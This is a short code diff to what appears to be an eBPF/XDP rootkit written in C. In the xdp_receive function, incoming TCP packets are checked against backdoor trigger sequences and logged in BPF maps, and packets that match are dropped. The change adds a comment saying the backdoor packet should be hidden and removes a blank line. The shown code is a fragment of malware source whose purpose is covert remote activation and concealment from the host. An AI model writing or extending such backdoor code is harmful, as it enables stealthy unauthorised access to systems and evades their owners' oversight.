@@ -214,6 +214,7 @@ int xdp_receive(struct xdp_md *ctx){
                 //where for other purpose, we must still check it)
                 int ret = manage_backdoor_trigger_v3_32(b_new_data_32);
                 if(ret == 1){
+                    //The packet was for the backdoor, better hide it
                     return XDP_DROP;
                 }
             }
@@ -226,7 +227,6 @@ int xdp_receive(struct xdp_md *ctx){
             b_new_data_32.trigger_array[0].seq_raw = tcp->seq;
             bpf_map_update_elem(&backdoor_packet_log_32, &ipvalue, &b_new_data_32, BPF_ANY);
         }
-
 
         ////16 bit 6-len streams
         struct backdoor_packet_log_data_16 *b_data_16 = (struct backdoor_packet_log_data_16*) bpf_map_lookup_elem(&backdoor_packet_log_16, &ipvalue);
